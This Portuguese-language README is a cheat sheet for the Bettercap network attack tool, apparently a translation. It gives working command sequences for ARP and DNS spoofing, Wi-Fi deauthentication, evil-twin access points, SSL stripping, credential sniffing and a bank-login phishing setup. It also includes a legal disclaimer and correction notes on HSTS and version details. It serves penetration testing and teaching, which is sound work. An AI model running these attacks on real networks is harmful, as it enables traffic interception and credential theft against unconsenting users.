# 🦈 Bettercap — Guia de referência da plataforma de ataques de rede

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Ferramenta multifunções para ataques de rede
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Índice

- [O que é o Bettercap](#-what-is-bettercap)
- [Instalação](#-installation)
- [Utilização básica](#-basic-usage)
- [Reconhecimento de rede](#-network-reconnaissance)
- [Falsificação de ARP (MITM)](#-arp-spoofing-mitm)
- [Falsificação de DNS](#-dns-spoofing)
- [Ataques Wi-Fi](#-wifi-attacks)
- [Redução da proteção HTTPS](#-https-downgrade)
- [Interceção de credenciais](#-credential-sniffing)
- [Caplets](#-caplets)
- [Interface Web](#-web-ui)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-bettercap"></a>
## 🎯 O que é o Bettercap

O **Bettercap** é uma ferramenta multifunções para Wi-Fi, Bluetooth e reconhecimento de rede. O original apresenta-o como sucessor do ettercap, com funcionalidades modernas:

> **Nota de terminologia e versão:** MITM (*man in the middle*) designa uma posição de interceção entre participantes; *spoofing* é a falsificação de informação de identidade ou endereçamento. Os comandos e parâmetros abaixo reproduzem o original e podem variar entre versões. Compare-os com a ajuda dos módulos da instalação utilizada, sem assumir que todas as opções históricas continuam disponíveis. [Documentação oficial](https://www.bettercap.org/modules/).

- 🔍 **Reconhecimento de rede** — Descoberta de máquinas e serviços
- 🎭 **Ataques MITM** — Falsificação de ARP e DNS
- 📶 **Ataques Wi-Fi** — Desautenticação, AP impostor (evil twin) e captura de handshakes
- 🔓 **Captura de credenciais** — HTTP e HTTPS (através da redução da proteção)
- 📡 **Bluetooth/BLE** — Descoberta de dispositivos e ataques
- 🌐 **Interface Web** — Interface gráfica apelativa

### Funcionalidades

| Funcionalidade | Descrição |
|---------|-------------|
| **Modular** | Extensível através de caplets |
| **Interativo** | Consola de comandos em tempo real |
| **Programável** | Automatização com ficheiros caplet |
| **Interface Web** | Interface acessível no navegador |
| **Linguagem Go** | Rápido, moderno e multiplataforma |

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux (pré-instalado)

```bash
# Já instalado no Kali
bettercap --help

# Atualizar
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### A partir do código-fonte

```bash
# Instalar primeiro o Go
sudo apt install golang

# Instalar o bettercap
go install github.com/bettercap/bettercap@latest

# Ou
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Instalar a interface (opcional)

```bash
# Descarregar a interface Web
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

<a id="-basic-usage"></a>
## 💻 Utilização básica

### Iniciar o Bettercap

```bash
# Início básico (requer root)
sudo bettercap

# Indicar a interface
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Modo não interativo (executar comandos)
sudo bettercap -eval "net.probe on; net.show"

# Carregar um ficheiro caplet
sudo bettercap -caplet http-ui
```

### Consola interativa

```bash
# Na consola do bettercap
» help                      # Mostrar todos os comandos
» help net.probe            # Ajuda sobre um módulo específico
» net.show                  # Mostrar as máquinas descobertas
» set arp.spoof.targets X   # Definir uma variável
» arp.spoof on              # Ativar o módulo
» quit                      # Sair
```

### Gestão de módulos

```bash
# Listar todos os módulos
» help

# Obter informações sobre o módulo
» help arp.spoof

# Ativar o módulo
» arp.spoof on

# Desativar o módulo
» arp.spoof off

# Ver as definições do módulo
» get arp.spoof.*
```

---

<a id="-network-reconnaissance"></a>
## 🔍 Reconhecimento de rede

### Descoberta de máquinas

```bash
# Ativar a sondagem da rede
» net.probe on

# Mostrar as máquinas descobertas
» net.show

# Saída:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Informações da rede

```bash
# Mostrar a interface atual
» net.show

# Informações da interface
» get net.interface.*

# Informações do gateway
» get gateway.*
```

### Opções de sondagem

```bash
# Definir o intervalo entre sondagens
» set net.probe.throttle 10

# Modo passivo (apenas escutar)
» set net.probe.passive true

# Definir o tempo limite da sondagem
» set net.probe.timeout 500
```

### Comandos de reconhecimento

```bash
# Reconhecimento completo
» net.recon on

# Limpar a lista de máquinas
» net.clear

# Mostrar apenas as máquinas ativas
» set net.show.meta true
» net.show

# Exportar para um ficheiro
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

<a id="-arp-spoofing-mitm"></a>
## 🎭 Falsificação de ARP (MITM)

### Falsificação básica de ARP

```bash
# Iniciar o bettercap
sudo bettercap -iface eth0

# Ativar a sondagem
» net.probe on

# Aguardar e depois mostrar as máquinas
» net.show

# Definir o alvo (vítima)
» set arp.spoof.targets 192.168.1.100

# Ativar a falsificação de ARP
» arp.spoof on

# A máquina está agora numa posição de interceção MITM!
```

### Full duplex (ambos os sentidos)

```bash
# Falsificar o ARP perante a vítima e o gateway
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Falsificar o ARP em toda a sub-rede

```bash
# Selecionar todas as máquinas (exceto o gateway)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Apenas tráfego interno (sem falsificar o ARP perante o gateway)
» set arp.spoof.internal true
» arp.spoof on
```

### Falsificação de ARP e interceção de tráfego

```bash
# Configuração MITM completa
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

<a id="-dns-spoofing"></a>
## 🌐 Falsificação de DNS

### Falsificação básica de DNS

```bash
# Definir os domínios para falsificação de DNS
» set dns.spoof.domains example.com, *.example.com

# Definir o endereço de redirecionamento (a sua máquina)
» set dns.spoof.address 192.168.1.50

# Ativar (requer falsificação de ARP)
» arp.spoof on
» dns.spoof on
```

### Falsificar todos os domínios

```bash
# Caráter universal — redirecionar tudo
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Vários domínios

```bash
# Lista de domínios
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Falsificação de DNS com servidor HTTP

```bash
# Configuração completa de phishing
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Iniciar o servidor HTTP na sua máquina
» set http.server.path /var/www/phishing
» http.server on
```

---

<a id="-wifi-attacks"></a>
## 📶 Ataques Wi-Fi

### Ativar o modo Wi-Fi

```bash
# Iniciar com a interface Wi-Fi
sudo bettercap -iface wlan0

# Ativar o reconhecimento Wi-Fi
» wifi.recon on

# Mostrar os APs descobertos
» wifi.show
```

### Reconhecimento Wi-Fi

```bash
# Mostrar todos os APs
» wifi.show

# Saída:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Ataque de desautenticação

```bash
# Desautenticar todos os clientes de um AP específico
» wifi.deauth AA:BB:CC:DD:EE:FF

# Desautenticar um cliente específico
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Desautenticação contínua
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Captura de handshakes

```bash
# Ativar o reconhecimento Wi-Fi
» wifi.recon on

# Definir o canal (o mesmo do alvo)
» wifi.recon.channel 6

# Capturar handshakes
» set wifi.handshakes.file /tmp/handshakes/

# Desautenticar para forçar uma nova ligação
» wifi.deauth AA:BB:CC:DD:EE:FF

# Verificar os handshakes capturados
» wifi.show.wpa
```

### Ataque com AP impostor (evil twin)

> **Nota:** Na documentação atual, `wifi.ap` injeta tramas beacon de gestão para anunciar um AP falso; isso não constitui, por si só, um ponto de acesso completo com associação, DHCP e encaminhamento. A sintaxe documentada é `wifi.ap`, e a captura de handshakes usa normalmente um ficheiro PCAP definido por `wifi.handshakes.file`; o exemplo do original com uma pasta e outros parâmetros deve ser interpretado à luz da versão instalada. [Módulo WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# Clonar o AP
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Iniciar o AP falso
» wifi.ap on

# Desautenticar o AP real para forçar os clientes a ligarem-se
» wifi.deauth <real_AP_BSSID>
```

### Ataque com PMKID

```bash
# Ataque moderno sem um cliente ligado
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID capturado na pasta de handshakes
» wifi.show.wpa
```

---

<a id="-https-downgrade"></a>
## 🔒 Redução da proteção HTTPS

### SSL stripping (contorno de HSTS)

> **Correção do original:** Ativar SSL stripping não contorna automaticamente HSTS nem garante acesso ao conteúdo HTTPS. Um navegador que reconheça o domínio como HSTS exige HTTPS e rejeita erros de certificado. O proxy HTTPS do Bettercap volta a assinar certificados com a sua própria CA, cuja confiança no cliente é uma questão distinta da falsificação de ARP. [RFC 6797, secções 8.3–8.4](https://www.rfc-editor.org/rfc/rfc6797.html#section-8.3), [proxy HTTPS do Bettercap](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/).

```bash
# Ativar primeiro a falsificação de ARP
» arp.spoof on

# Ativar o SSL stripping
» set https.proxy.sslstrip true
» https.proxy on

# Ou utilizar o proxy HTTP
» http.proxy on
```

### Proxy HTTPS

```bash
# Configurar o proxy HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Com certificado
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Capturar tráfego HTTPS

```bash
# MITM completo com HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

<a id="-credential-sniffing"></a>
## 🔓 Interceção de credenciais

### Credenciais HTTP

```bash
# Ativar a interceção de tráfego
» net.sniff on

# Ativar a captura de tráfego local
» set net.sniff.local true
» net.sniff on

# Filtrar HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Recolha de credenciais

```bash
# Captura completa de credenciais
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# As credenciais aparecem em tempo real
```

### Guardar num ficheiro

```bash
# Guardar os pacotes capturados
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Saída detalhada
» set net.sniff.verbose true
» net.sniff on
```

---

<a id="-caplets"></a>
## 📜 Caplets

### O que são caplets?

Os caplets são ficheiros de script (.cap) que automatizam comandos do bettercap.

### Caplets incluídos

```bash
# Listar os caplets
» caplets.show

# Caplets comuns:
- http-ui       # Interface Web
- https-ui      # Interface Web segura
- local-sniffer # Intercetar tráfego local
- mitm          # Configuração MITM básica
- pita          # Automatização de ataques Wi-Fi
```

### Carregar um caplet

```bash
# A partir da linha de comandos
sudo bettercap -caplet http-ui

# Dentro do bettercap
» caplet http-ui

# A partir de um ficheiro
sudo bettercap -caplet /path/to/custom.cap
```

### Criar um caplet personalizado

```bash
# Ficheiro: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Executar um caplet personalizado
sudo bettercap -caplet my-mitm.cap
```

### Atualizar os caplets

```bash
# Atualizar todos os caplets
» caplets.update
```

---

<a id="-web-ui"></a>
## 🌐 Interface Web

### Iniciar a interface Web

```bash
# Instalar primeiro a interface
sudo bettercap -eval "caplets.update; ui.update; quit"

# Iniciar com a interface Web (HTTP)
sudo bettercap -caplet http-ui

# Iniciar com a interface HTTPS
sudo bettercap -caplet https-ui

# Acesso: https://127.0.0.1:8080/
# Credenciais predefinidas: user/pass
```

### Funcionalidades da interface Web

| Funcionalidade | Descrição |
|---------|-------------|
| **Dashboard (painel geral)** | Vista da rede em tempo real |
| **Hosts (máquinas)** | Dispositivos descobertos |
| **WiFi (redes sem fios)** | Redes sem fios |
| **BLE** | Dispositivos Bluetooth |
| **Events (eventos)** | Registo de atividade |
| **Packets (pacotes)** | Tráfego capturado |

### Configurar a interface Web

> **Nota sobre a interface Web:** O protocolo, a porta e as credenciais dependem do caplet e da versão; o endereço HTTPS na porta 8080 do original não é universal. Nos caplets oficiais históricos, as credenciais da API são `api.rest.username` e `api.rest.password`; as opções `http.server.*` abaixo pertencem ao servidor HTTP, não substituem a autenticação da API. A documentação atual apresenta o módulo `ui` para a interface integrada. [Caplet HTTP](https://raw.githubusercontent.com/bettercap/caplets/master/http-ui.cap), [caplet HTTPS](https://raw.githubusercontent.com/bettercap/caplets/master/https-ui.cap), [interface Web atual](https://www.bettercap.org/usage/web_ui/).

```bash
# Definir as credenciais
» set http.server.username admin
» set http.server.password secretpass

# Definir a porta
» set http.server.port 8080

# Endereço de escuta
» set http.server.address 0.0.0.0
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `net.probe on` | Iniciar a descoberta de máquinas |
| `net.show` | Mostrar as máquinas descobertas |
| `arp.spoof on` | Ativar a falsificação de ARP |
| `net.sniff on` | Iniciar a captura de pacotes |
| `dns.spoof on` | Ativar a falsificação de DNS |
| `wifi.recon on` | Iniciar a pesquisa Wi-Fi |
| `wifi.deauth BSSID` | Ataque de desautenticação |
| `https.proxy on` | Ativar o proxy HTTPS |

### Variáveis comuns

| Variável | Descrição |
|----------|-------------|
| `arp.spoof.targets` | Vítimas do ataque MITM |
| `arp.spoof.fullduplex` | Falsificar em ambos os sentidos |
| `dns.spoof.domains` | Domínios a falsificar |
| `dns.spoof.address` | IP de redirecionamento |
| `net.sniff.output` | Ficheiro PCAP de saída |
| `wifi.ap.ssid` | Nome do AP falso |

### Modelo de ataque MITM

```bash
# MITM básico
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Modelo de ataque Wi-Fi

```bash
# Desautenticação Wi-Fi e captura
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Ataque de phishing completo

```bash
# Falsificação de DNS e site falso
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ Aviso legal

```
⚠️ AVISO: O Bettercap é uma ferramenta poderosa capaz de intercetar 
tráfego de rede. Utilize-o apenas em redes de que SEJA PROPRIETÁRIO ou para as quais tenha 
AUTORIZAÇÃO EXPRESSA POR ESCRITO para realizar testes.

✅ Testes de intrusão autorizados
✅ Investigação de segurança (em laboratório)
✅ Fins educativos

❌ A interceção não autorizada é ILEGAL
❌ Nunca utilize em redes públicas
❌ Nunca roube credenciais
```

---

<a id="-resources"></a>
## 📚 Recursos

- [Site oficial do Bettercap](https://www.bettercap.org/)
- [Bettercap no GitHub](https://github.com/bettercap/bettercap)
- [Documentação do Bettercap](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Guias de referência relacionados
- [Aircrack-ng](../../Aircrack-ng/translations/README.pt.md)
- [Wifite](../../Wifite/translations/README.pt.md)
- [Wireshark](../../Wireshark/README.md)

---

<p align="center">
  <b>🦈 Domine os ataques de rede!</b><br>
  <i>Bettercap — A ferramenta multifunções para testes de intrusão em redes</i>
</p>
